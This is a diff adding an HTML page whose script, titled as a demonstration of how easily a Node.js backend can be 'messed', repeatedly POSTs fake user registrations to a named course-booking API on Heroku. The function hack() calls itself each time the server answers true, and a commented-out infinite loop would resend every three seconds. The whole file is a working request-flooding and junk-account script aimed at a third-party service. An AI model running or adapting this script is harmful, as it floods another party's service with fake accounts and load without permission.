@@ -1,0 +1,61 @@
+<!-- this is the code showing how easily mess the node.js framework -->
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <div id="app"></div>
+    <script>
+        i = 0;
+
+        function hack() {
+            fn = 'John';
+            ln = 'Doe';
+            e = 'dontcontactme@gmail.com';
+            password = 'xyzyzy';
+            mn = '099999';
+            x = document.querySelector("#app");
+            fetch('https://course-booking-api.herokuapp.com/api/users/register', {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    firstName: fn,
+                    lastName: ln,
+                    email: e,
+                    mobileNo: mn,
+                    password: password,
+                })
+            })
+                .then(result => result.json())
+                .then(result => {
+                    console.log(result);
+                    y = document.createElement('div');
+
+                    i = i + 1;
+                    y.innerHTML = i + 'registered fetching https://course-booking-api.herokuapp.com/api/users/checkEmail';
+                    x.append(y);
+                    if (result == true) {
+                        return hack()
+                    }
+                });
+        }
+
+        hack()
+
+        // do {
+        //     setInterval(hack()
+        //     ,3000);
+        // } while ( 1 != 2)
+    </script>
+
+</body>
+
+</html>
